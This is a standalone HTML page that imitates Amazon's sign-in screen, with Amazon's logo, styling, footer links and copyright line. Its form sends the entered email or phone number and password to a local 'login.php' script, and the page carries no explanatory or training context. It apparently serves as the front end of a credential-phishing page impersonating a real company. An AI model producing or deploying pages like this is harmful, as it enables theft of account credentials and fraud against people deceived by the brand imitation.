<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fff;
            color: #111;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo {
            margin: 20px 0;
            width: 103px;
            height: 31px;
        }
        .container {
            width: 350px;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 20px 26px;
            margin-bottom: 22px;
        }
        h1 {
            font-weight: 400;
            font-size: 28px;
            line-height: 1.2;
            margin-bottom: 10px;
            margin-top: 0;
        }
        label {
            font-weight: 700;
            font-size: 13px;
            padding-left: 2px;
            padding-bottom: 2px;
            display: block;
            margin-top: 15px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            height: 31px;
            padding: 3px 7px;
            border: 1px solid #a6a6a6;
            border-top-color: #949494;
            border-radius: 3px;
            box-shadow: 0 1px 0 rgba(255,255,255,.5), 0 1px 0 rgba(0,0,0,.07) inset;
            outline: 0;
            box-sizing: border-box;
            font-size: 13px;
            line-height: normal;
        }
        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228,121,17,.5);
        }
        .signin-btn {
            display: block;
            width: 100%;
            height: 29px;
            margin-top: 15px;
            background: linear-gradient(to bottom,#f7dfa5,#f0c14b);
            border-color: #a88734 #9c7e31 #846a29;
            color: #111;
            border-width: 1px;
            border-style: solid;
            border-radius: 3px;
            cursor: pointer;
        }
        .signin-btn:hover {
            background: linear-gradient(to bottom,#f5d78e,#eeb933);
        }
        .divider {
            height: 1px;
            background-color: #e7e7e7;
            position: relative;
            margin-top: 25px;
            margin-bottom: 14px;
        }
        .divider-text {
            line-height: 1;
            font-size: 12px;
            color: #767676;
            font-weight: 400;
            position: absolute;
            top: -7px;
            left: 50%;
            background-color: #fff;
            padding: 0 8px 0 7px;
            transform: translateX(-50%);
        }
        .create-btn {
            display: block;
            width: 100%;
            height: 29px;
            margin-top: 15px;
            background: linear-gradient(to bottom,#f7f8fa,#e7e9ec);
            border-color: #adb1b8 #a2a6ac #8d9096;
            color: #111;
            border-width: 1px;
            border-style: solid;
            border-radius: 3px;
            cursor: pointer;
        }
        .create-btn:hover {
            background: linear-gradient(to bottom,#e7eaf0,#d9dce1);
        }
        .help-section {
            margin-top: 15px;
        }
        .help-section a {
            font-size: 13px;
            color: #0066c0;
            text-decoration: none;
        }
        .help-section a:hover {
            color: #c45500;
            text-decoration: underline;
        }
        footer {
            margin-top: 26px;
            width: 100%;
            text-align: center;
            font-size: 11px;
            color: #555;
        }
        .footer-links {
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon logo" class="logo">
    
    <div class="container">
        <h1>Sign in</h1>
        
        <form action="login.php" method="post">
            <label for="email">Email or mobile phone number</label>
            <input type="email" id="email" name="username" required>
            
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            
            <button type="submit" class="signin-btn">Sign in</button>
            
            <div class="help-section">
                <a href="#">Forgot your password?</a>
            </div>
        </form>
        
        <div class="divider">
            <h5 class="divider-text">New to Amazon?</h5>
        </div>
        
        <button class="create-btn">Create your Amazon account</button>
    </div>
    
    <footer>
        <div class="footer-links">
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </div>
        <div>&copy; 1996-2023, Amazon.com, Inc. or its affiliates</div>
    </footer>
</body>
</html>
